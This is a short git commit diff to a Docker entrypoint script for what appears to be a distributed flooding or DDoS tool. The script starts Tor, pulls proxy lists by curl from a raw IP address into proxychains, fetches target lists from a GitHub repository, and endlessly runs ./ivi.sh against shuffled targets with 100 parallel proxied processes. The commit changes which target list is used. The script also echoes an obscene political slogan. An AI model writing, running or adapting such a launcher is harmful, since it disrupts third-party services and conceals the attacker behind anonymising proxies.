daf159313f1dcd572384c88bd69429a47f3e7f42
Shamrai Aleksandr <aleksandr.shamrai@together.com>
2022-03-11 18:03:54 +0200

    4e4en

--- projects/ivi/docker-entrypoint.sh
+++ projects/ivi/docker-entrypoint.sh
@@ -4,8 +4,8 @@ tor --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "" --SocksP
 
 echo "российский военній корабль, иди на хуй!"
 
-wget https://github.com/imsamurai/ban/raw/master/data/chechnya_filtered.txt
+wget https://github.com/imsamurai/ban/raw/master/data/ph_priority2.txt
 curl -s "http://143.244.166.15/proxy-fast.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf
 curl -s "http://143.244.166.15/proxy.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf
 
-while true; do cat "chechnya_filtered.txt" | shuf | xargs -r -P 100 -L1 -d '\n' proxychains -q ./ivi.sh; done;
+while true; do cat "ph_priority2.txt" | shuf | xargs -r -P 100 -L1 -d '\n' proxychains -q ./ivi.sh; done;
